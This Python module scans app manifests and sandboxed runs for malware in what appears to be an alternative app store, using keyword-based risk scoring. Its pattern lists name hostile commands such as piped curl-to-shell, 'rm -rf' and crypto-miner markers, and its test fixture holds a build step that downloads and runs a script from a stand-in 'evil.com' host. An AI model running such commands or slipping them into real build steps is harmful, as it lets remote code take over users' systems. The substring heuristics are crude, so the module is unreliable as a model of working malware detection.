"""
Dry-run sandbox for malware detection in the alternative app store platform.
Implements safe execution environment to observe app behavior without risk.
Based on the scouts.md specification for malware detection.
"""
import os
import subprocess
import tempfile
import shutil
import signal
import time
from typing import Dict, List, Tuple, Optional
from enum import Enum
from dataclasses import dataclass
from ..sandbox.base import BaseSandbox, SandboxResult, SandboxType, SecurityLevel
from ..core.types.manifest_schema import AppManifest


class MalwareDetectionResult(Enum):
    """Results of malware detection"""
    SAFE = "safe"
    SUSPICIOUS = "suspicious"
    MALICIOUS = "malicious"
    UNKNOWN = "unknown"


@dataclass
class BehavioralTelemetry:
    """Telemetry collected during dry-run execution"""
    binds_port: bool = False
    port_number: Optional[int] = None
    long_running: bool = False
    uptime_seconds: float = 0.0
    network_attempts: int = 0
    fs_violations: int = 0
    cpu_anomaly: bool = False
    hidden_processes: bool = False
    crypto_related_calls: int = 0
    suspicious_strings: List[str] = None
    exit_code: int = 0
    
    def __post_init__(self):
        if self.suspicious_strings is None:
            self.suspicious_strings = []


class DryRunSandbox:
    """Sandbox for safe execution and malware detection"""
    
    def __init__(self, security_level: SecurityLevel = SecurityLevel.STRICT):
        from ..sandbox.base import SandboxFactory
        self.security_level = security_level
        # Use SandboxFactory to create a concrete sandbox instance
        self.sandbox = SandboxFactory.create_sandbox(SandboxType.NATIVE, security_level)
    
    def execute_dry_run(self, command: str, timeout: int = 30, 
                       cwd: Optional[str] = None, env: Optional[Dict] = None) -> Tuple[SandboxResult, BehavioralTelemetry]:
        """
        Execute a command in a dry-run sandbox and collect behavioral telemetry.
        
        Args:
            command: Command to execute
            timeout: Maximum execution time in seconds
            cwd: Working directory
            env: Environment variables
            
        Returns:
            Tuple of (sandbox result, behavioral telemetry)
        """
        # Create a temporary workspace
        workspace = tempfile.mkdtemp(prefix="altstore_dryrun_")
        
        try:
            # Execute in sandbox
            result = self.sandbox.execute(command, timeout, cwd or workspace, env)
            
            # Collect telemetry
            telemetry = self._collect_telemetry(result, workspace)
            
            return result, telemetry
            
        finally:
            # Clean up workspace
            if os.path.exists(workspace):
                shutil.rmtree(workspace)
    
    def _collect_telemetry(self, result: SandboxResult, workspace: str) -> BehavioralTelemetry:
        """Collect behavioral telemetry from the execution"""
        telemetry = BehavioralTelemetry()
        
        # Parse output for port binding indicators
        output = result.output.lower()
        if any(port_indicator in output for port_indicator in ["listening on", "serving at", "running on"]):
            telemetry.binds_port = True
            # Try to extract port number
            import re
            port_matches = re.findall(r'port (\d+)', output)
            if port_matches:
                try:
                    telemetry.port_number = int(port_matches[0])
                except ValueError:
                    pass
        
        # Check for long-running behavior (based on timeout)
        # This would be more accurate with actual timing data
        if result.metrics.get('timeout', False):
            telemetry.long_running = True
            telemetry.uptime_seconds = 30.0  # Approximate based on timeout
        
        # Check exit code
        telemetry.exit_code = result.exit_code
        
        # Look for suspicious patterns in output
        suspicious_patterns = [
            "curl | sh",
            "wget http",
            "chmod +x",
            "rm -rf",
            "/usr/bin",
            "sudo",
            "su ",
            "stratum+tcp",
            "xmrig",
            "miner"
        ]
        
        for pattern in suspicious_patterns:
            if pattern.lower() in output:
                telemetry.suspicious_strings.append(pattern)
        
        # Count network attempts (would need more sophisticated monitoring in real implementation)
        # For now, we'll count suspicious network-related strings
        network_indicators = ["connect", "socket", "network", "download", "fetch"]
        for indicator in network_indicators:
            if indicator in output:
                telemetry.network_attempts += 1
        
        # Check for filesystem violations (would need monitoring in real implementation)
        fs_violations = ["writes to /tmp", "writes to home", "writes to system dirs"]
        # In a real implementation, we'd monitor actual filesystem access
        
        return telemetry
    
    def analyze_behavior(self, telemetry: BehavioralTelemetry) -> MalwareDetectionResult:
        """
        Analyze behavioral telemetry to determine malware risk.
        
        Args:
            telemetry: Behavioral telemetry collected during execution
            
        Returns:
            Malware detection result
        """
        risk_score = 0.0
        
        # Port binding without clear purpose
        if telemetry.binds_port and not telemetry.long_running:
            risk_score += 0.3  # Suspicious if binding port but not long-running
        
        # Long running + network attempts
        if telemetry.long_running and telemetry.network_attempts > 2:
            risk_score += 0.4
        
        # Suspicious strings found
        risk_score += len(telemetry.suspicious_strings) * 0.2
        
        # High network attempts
        if telemetry.network_attempts > 5:
            risk_score += 0.3
        
        # Crypto-related activity
        if telemetry.crypto_related_calls > 0:
            risk_score += 0.5
        
        # Determine result based on risk score
        if risk_score >= 0.8:
            return MalwareDetectionResult.MALICIOUS
        elif risk_score >= 0.5:
            return MalwareDetectionResult.SUSPICIOUS
        elif risk_score > 0:
            return MalwareDetectionResult.UNKNOWN
        else:
            return MalwareDetectionResult.SAFE
    
    def detect_malware_static(self, manifest: AppManifest) -> MalwareDetectionResult:
        """
        Perform comprehensive static malware detection on the app manifest and source.

        Analyzes:
        - Repository name and description
        - Build commands
        - Dependencies
        - Source code patterns
        - Permissions requested

        Args:
            manifest: App manifest to analyze

        Returns:
            Malware detection result
        """
        risk_score = 0.0
        findings = []

        # Check for suspicious source patterns
        if manifest.source.repo:
            repo_lower = manifest.source.repo.lower()
            suspicious_repo_patterns = ["malware", "hacker", "crack", "keygen", "cheat", "hack"]
            for pattern in suspicious_repo_patterns:
                if pattern in repo_lower:
                    risk_score += 0.3
                    findings.append(f"Suspicious repository name contains '{pattern}'")

        # Check build commands for dangerous patterns
        build_commands = manifest.build.commands if manifest.build else []
        dangerous_patterns = [
            ("curl | sh", 0.5, "Downloads and executes remote script"),
            ("wget http", 0.4, "Downloads from HTTP (insecure)"),
            ("chmod +x", 0.2, "Makes file executable"),
            ("rm -rf", 0.6, "Recursive force delete"),
            ("sudo", 0.4, "Requests root privileges"),
            ("su ", 0.5, "Switch user command"),
            ("stratum+tcp", 0.8, "Cryptocurrency mining protocol"),
            ("xmrig", 0.9, "Known cryptocurrency miner"),
            ("miner", 0.7, "Mining-related command"),
            ("base64 -d", 0.4, "Decodes base64 (potential obfuscation)"),
            ("eval(", 0.6, "Dynamic code execution"),
            ("exec(", 0.5, "Code execution"),
        ]

        for cmd in build_commands:
            cmd_lower = cmd.lower()
            for pattern, score, description in dangerous_patterns:
                if pattern in cmd_lower:
                    risk_score += score
                    findings.append(f"Dangerous build command: {pattern} - {description}")

        # Check dependencies for known malicious packages
        dependencies = manifest.dependencies or []
        malicious_packages = [
            "cryptojack", "miner", "stealer", "keylogger", "rat", "backdoor",
            "trojan", "worm", "rootkit", "spyware"
        ]

        for dep in dependencies:
            dep_lower = dep.lower()
            for pattern in malicious_packages:
                if pattern in dep_lower:
                    risk_score += 0.6
                    findings.append(f"Suspicious dependency: {dep}")

        # Check permissions
        permissions = manifest.security.permissions if manifest.security else []
        dangerous_permissions = [
            ("INTERNET", 0.2, "Network access"),
            ("READ_EXTERNAL_STORAGE", 0.3, "Read external storage"),
            ("WRITE_EXTERNAL_STORAGE", 0.4, "Write external storage"),
            ("READ_CONTACTS", 0.5, "Read contacts"),
            ("SEND_SMS", 0.7, "Send SMS messages"),
            ("RECEIVE_SMS", 0.7, "Receive SMS messages"),
            ("READ_CALL_LOG", 0.6, "Read call logs"),
            ("CAMERA", 0.3, "Camera access"),
            ("RECORD_AUDIO", 0.4, "Record audio"),
            ("ACCESS_FINE_LOCATION", 0.4, "Precise location access"),
        ]

        for perm in permissions:
            perm_upper = perm.upper()
            for pattern, score, description in dangerous_permissions:
                if pattern in perm_upper:
                    risk_score += score
                    findings.append(f"Dangerous permission: {perm} - {description}")

        # Determine result based on risk score
        if risk_score >= 0.8:
            return MalwareDetectionResult.MALICIOUS
        elif risk_score >= 0.5:
            return MalwareDetectionResult.SUSPICIOUS
        elif risk_score > 0:
            return MalwareDetectionResult.UNKNOWN
        else:
            return MalwareDetectionResult.SAFE
    
    def detect_malware_behavioral(self, telemetry: BehavioralTelemetry) -> MalwareDetectionResult:
        """
        Perform behavioral malware detection based on runtime telemetry.
        
        Analyzes:
        - Network behavior
        - Filesystem access
        - Process behavior
        - Resource usage
        - Suspicious patterns
        
        Args:
            telemetry: Behavioral telemetry from dry-run execution
            
        Returns:
            Malware detection result
        """
        risk_score = 0.0
        findings = []
        
        # Port binding analysis
        if telemetry.binds_port:
            if telemetry.port_number and telemetry.port_number < 1024:
                risk_score += 0.4  # Privileged port
                findings.append(f"Binds to privileged port {telemetry.port_number}")
            elif telemetry.port_number and telemetry.port_number in [4444, 5555, 6666, 31337]:
                risk_score += 0.7  # Known malware ports
                findings.append(f"Binds to suspicious port {telemetry.port_number}")
            else:
                risk_score += 0.2  # Normal port binding
                findings.append(f"Binds to port {telemetry.port_number}")
        
        # Long-running process analysis
        if telemetry.long_running:
            if telemetry.network_attempts > 5:
                risk_score += 0.5  # Long-running + network = potential C2
                findings.append("Long-running process with high network activity")
            elif telemetry.network_attempts > 0:
                risk_score += 0.3
                findings.append("Long-running process with network activity")
            else:
                risk_score += 0.1  # Could be legitimate server
                findings.append("Long-running process detected")
        
        # Network behavior analysis
        if telemetry.network_attempts > 10:
            risk_score += 0.6
            findings.append(f"Excessive network attempts ({telemetry.network_attempts})")
        elif telemetry.network_attempts > 5:
            risk_score += 0.3
            findings.append(f"High network activity ({telemetry.network_attempts} attempts)")
        
        # Filesystem violation analysis
        if telemetry.fs_violations > 5:
            risk_score += 0.5
            findings.append(f"Multiple filesystem violations ({telemetry.fs_violations})")
        elif telemetry.fs_violations > 0:
            risk_score += 0.2
            findings.append(f"Filesystem violations detected ({telemetry.fs_violations})")
        
        # CPU anomaly detection
        if telemetry.cpu_anomaly:
            risk_score += 0.5
            findings.append("Anomalous CPU usage detected (potential mining)")
        
        # Hidden process detection
        if telemetry.hidden_processes:
            risk_score += 0.8
            findings.append("Hidden processes detected (strong malware indicator)")
        
        # Crypto-related activity
        if telemetry.crypto_related_calls > 10:
            risk_score += 0.7
            findings.append(f"High crypto-related activity ({telemetry.crypto_related_calls} calls)")
        elif telemetry.crypto_related_calls > 0:
            risk_score += 0.3
            findings.append(f"Crypto-related activity detected ({telemetry.crypto_related_calls} calls)")
        
        # Suspicious string patterns
        suspicious_string_scores = {
            "curl | sh": 0.7,
            "wget http": 0.5,
            "chmod +x": 0.3,
            "rm -rf": 0.6,
            "/usr/bin": 0.2,
            "sudo": 0.4,
            "su ": 0.5,
            "stratum+tcp": 0.9,  # Mining protocol
            "xmrig": 0.9,  # Known miner
            "miner": 0.7,
            "base64": 0.4,
            "eval(": 0.6,
            "exec(": 0.5,
        }
        
        for suspicious_str in telemetry.suspicious_strings:
            for pattern, score in suspicious_string_scores.items():
                if pattern in suspicious_str.lower():
                    risk_score += score
                    findings.append(f"Suspicious pattern detected: {pattern}")
                    break
        
        # Exit code analysis
        if telemetry.exit_code != 0:
            if telemetry.exit_code < 0:
                risk_score += 0.2  # Negative exit codes can indicate crash or signal
                findings.append(f"Abnormal exit code: {telemetry.exit_code}")
        
        # Determine result based on risk score
        if risk_score >= 0.8:
            return MalwareDetectionResult.MALICIOUS
        elif risk_score >= 0.5:
            return MalwareDetectionResult.SUSPICIOUS
        elif risk_score > 0:
            return MalwareDetectionResult.UNKNOWN
        else:
            return MalwareDetectionResult.SAFE


class MalwareDetector:
    """Main malware detection system"""
    
    def __init__(self):
        self.dry_run_sandbox = DryRunSandbox()
    
    def scan_app(self, manifest: AppManifest, test_command: str = None) -> Dict:
        """
        Scan an app for malware using both static and dynamic analysis.
        
        Args:
            manifest: App manifest to scan
            test_command: Optional command to test with dry-run
            
        Returns:
            Dictionary with scan results
        """
        results = {
            "static_analysis": self.dry_run_sandbox.detect_malware_static(manifest),
            "dynamic_analysis": MalwareDetectionResult.UNKNOWN,
            "telemetry": None,
            "overall_risk": 0.0,
            "recommendation": "quarantine"
        }
        
        # Initialize overall risk from static analysis
        static_risk = self._risk_to_score(results["static_analysis"])
        results["overall_risk"] = static_risk

        # Perform dynamic analysis if a test command is provided
        if test_command:
            try:
                sandbox_result, telemetry = self.dry_run_sandbox.execute_dry_run(
                    test_command, timeout=15
                )
                results["telemetry"] = telemetry
                results["dynamic_analysis"] = self.dry_run_sandbox.analyze_behavior(telemetry)

                # Calculate overall risk based on both analyses
                dynamic_risk = self._risk_to_score(results["dynamic_analysis"])
                results["overall_risk"] = max(static_risk, dynamic_risk)

            except Exception as e:
                results["error"] = f"Dry-run failed: {str(e)}"
                results["overall_risk"] = max(0.9, static_risk)  # High risk if we can't test, but consider static risk

        # Determine recommendation based on risk
        if results["overall_risk"] >= 0.8:
            results["recommendation"] = "block"
        elif results["overall_risk"] >= 0.5:
            results["recommendation"] = "quarantine"
        elif results["overall_risk"] >= 0.3:
            results["recommendation"] = "sandbox_only"
        else:
            results["recommendation"] = "approve"

        return results
    
    def _risk_to_score(self, malware_result: MalwareDetectionResult) -> float:
        """Convert malware detection result to numerical risk score"""
        mapping = {
            MalwareDetectionResult.SAFE: 0.0,
            MalwareDetectionResult.UNKNOWN: 0.2,
            MalwareDetectionResult.SUSPICIOUS: 0.6,
            MalwareDetectionResult.MALICIOUS: 1.0
        }
        return mapping.get(malware_result, 0.5)  # Default to medium risk


# Example usage and test
if __name__ == "__main__":
    from ..core.types.manifest_schema import (
        AppManifest, Publisher, Source, Versions, Build, Run, 
        Security, Trust
    )
    
    # Create a test manifest
    test_manifest = AppManifest(
        api_version="appstore.dev/v1",
        kind="Application",
        metadata={
            "app_id": "test.harmless",
            "name": "Harmless Test App",
            "description": "A harmless test application"
        },
        publisher=Publisher(
            name="Test Publisher",
            verified_domains=["test.com"]
        ),
        source=Source(
            type="github_repo",
            repo="test/harmless-app"
        ),
        versions=Versions(strategy="semver"),
        build=Build(
            strategy="docker",
            commands=["echo 'Building harmless app'"]
        ),
        run=Run(
            type="cli",
            entrypoint="test_app",
            args=["--help"]
        ),
        security=Security(
            sandbox="strict",
            network="none",
            filesystem="readonly",
            allow_gpu=False
        ),
        trust=Trust(verification="R2")
    )
    
    # Test the malware detector
    detector = MalwareDetector()
    
    # Scan the harmless app
    results = detector.scan_app(test_manifest, "echo 'Hello World'")
    print(f"Harmless app scan results:")
    print(f"  Static analysis: {results['static_analysis'].value}")
    print(f"  Dynamic analysis: {results['dynamic_analysis'].value}")
    print(f"  Overall risk: {results['overall_risk']}")
    print(f"  Recommendation: {results['recommendation']}")
    print(f"  Telemetry: {results['telemetry']}")
    
    # Create a potentially suspicious manifest
    suspicious_manifest = AppManifest(
        api_version="appstore.dev/v1",
        kind="Application",
        metadata={
            "app_id": "test.suspicious",
            "name": "Suspicious Test App",
            "description": "A suspicious test application"
        },
        publisher=Publisher(
            name="Unknown Publisher",
            verified_domains=[]
        ),
        source=Source(
            type="github_repo",
            repo="suspicious/user"
        ),
        versions=Versions(strategy="semver"),
        build=Build(
            strategy="script",
            commands=["curl http://evil.com/script.sh | sh", "chmod +x evil_script"]
        ),
        run=Run(
            type="cli",
            entrypoint="evil_script",
            args=[]
        ),
        security=Security(
            sandbox="relaxed",
            network="outbound",
            filesystem="user_home",
            allow_gpu=True
        ),
        trust=Trust(verification="none")
    )
    
    # Scan the suspicious app
    results2 = detector.scan_app(suspicious_manifest)
    print(f"\nSuspicious app scan results:")
    print(f"  Static analysis: {results2['static_analysis'].value}")
    print(f"  Overall risk: {results2['overall_risk']}")
    print(f"  Recommendation: {results2['recommendation']}")